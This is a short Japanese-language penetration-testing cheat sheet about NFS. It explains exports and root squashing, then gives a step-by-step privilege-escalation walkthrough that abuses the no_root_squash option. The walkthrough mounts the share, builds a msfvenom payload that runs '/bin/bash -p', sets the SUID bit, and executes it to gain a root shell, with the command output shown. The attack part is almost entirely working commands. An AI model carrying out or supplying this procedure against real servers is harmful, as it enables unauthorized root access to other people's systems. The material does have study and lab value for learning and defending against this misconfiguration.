NFS (ネットワーク ファイル システム) は、一般的な分散ファイル システムです。  
NFS 共有は /etc/exports ファイルで構成されます。   
リモート ユーザーは、共有のマウント、ファイルへのアクセス、作成、変更を行うことができます。    
デフォルトでは、作成されたファイルは、NFS サーバーに存在しない場合でも、リモート ユーザーの ID とグループ ID を (それぞれ所有者とグループとして) 継承します。   

### 便利なコマンド
NFSサーバーのエクスポートリストを表示します。
```
$ showmount -e <target>
```
類似のNmapスクリプト。
```
$ nmap –sV –script=nfs-showmount <target>
```
NFS共有をマウントする。
```
$ mount -o rw,vers=2 <target>:<share> <local_directory>
```
### Root Squashing
ルート スカッシングは、NFS が明らかな権限昇格を防ぐ方法です。リモート ユーザーが root (または uid=0) である (または主張する) 場合、NFS は代わりにユーザーを「押しつぶし」、「nogroup」グループの「nobody」ユーザーであるかのように扱います。  
この動作はデフォルトですが、無効にすることができます!   
### no_root_squash
no_root_squash は、ルート スカッシュをオフにする NFS 構成オプションです。   
書き込み可能な共有構成に含まれている場合、「root」として識別されるリモート ユーザーは、ローカルの root ユーザーとして NFS 共有上にファイルを作成できます。   
# Privilege Escalation
1. etc/exportsにno_root_squashオプションが設定されているシェアがあるかどうか、内容を確認します。
```
$ cat /etc/exports
...
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
2. NFS共有がリモートマウント可能であることを確認します。
```
$ showmount -e 192.168.1.25
Exports list on 192.168.1.25:
/tmp
```
3. ローカルマシンにマウントポイントを作成し、NFS共有の/tmpをマウントします。
```
# mkdir /tmp/nfs
# mount -o rw,vers=2 192.168.1.25:/tmp /tmp/nfs
```
4. ローカルマシンのrootユーザーを使って、ペイロードを生成し、マウントした共有に保存してください。
```
# msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```
5. SUIDビットが設定され、誰でも実行可能なファイルであることを確認します。
```
# chmod +xs /tmp/nfs/shell.elf
```
6. ターゲットマシーンで、このファイルを実行し、ルートシェルを取得します。
```
$ /tmp/shell.elf
bash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
```
